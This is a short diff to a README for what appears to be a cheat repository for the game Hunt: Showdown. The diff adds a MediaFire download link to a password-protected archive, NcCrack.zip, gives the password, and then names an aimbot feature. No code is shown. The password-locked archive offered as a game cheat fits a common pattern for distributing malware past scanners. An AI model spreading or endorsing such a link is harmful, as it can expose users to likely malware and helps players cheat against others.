@@ -1,5 +1,11 @@
 # Cheat-for-Hunt-Showdown-by-NcCrack
 
+# Download cheat
+
+|[Download](https://www.mediafire.com/file/qxarg07b51hql0v/NcCrack.zip/file)|
+|:-------------|
+Passwrod: `2077`
+
 Functional:
 
 # Aimbot
